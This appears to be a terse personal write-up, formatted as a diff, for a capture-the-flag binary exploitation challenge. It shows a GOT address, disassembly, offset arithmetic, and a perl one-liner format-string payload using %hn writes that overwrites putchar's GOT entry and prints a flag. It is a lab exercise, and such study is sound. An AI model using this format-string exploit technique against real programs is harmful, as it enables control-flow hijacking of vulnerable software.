@@ -1,0 +1,15 @@
+loc of putchar@plt: 0x80499e0
+
+0x0804868f <+219>:	jne    0x804861a <main+102>
+   0x08048691 <+221>:	mov    DWORD PTR [esp+0x4],0x80487e6
+      0x08048699 <+229>:	mov    DWORD PTR [esp],0x80487e8
+	     0x080486a0 <+236>:	call   0x80484a4 <fopen@plt>]]
+-> jump $epi to 0x8048691
+
+offset = 6
+
+>>> 0x8691 - 8 = 34441
+>>> 0x10804 - 0x8691 = 33139
+
+[q4@localhost ~]$ perl -e 'print "\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn"'| ./q4
+=> FLAG_nwW6eP503Q3QI0zw
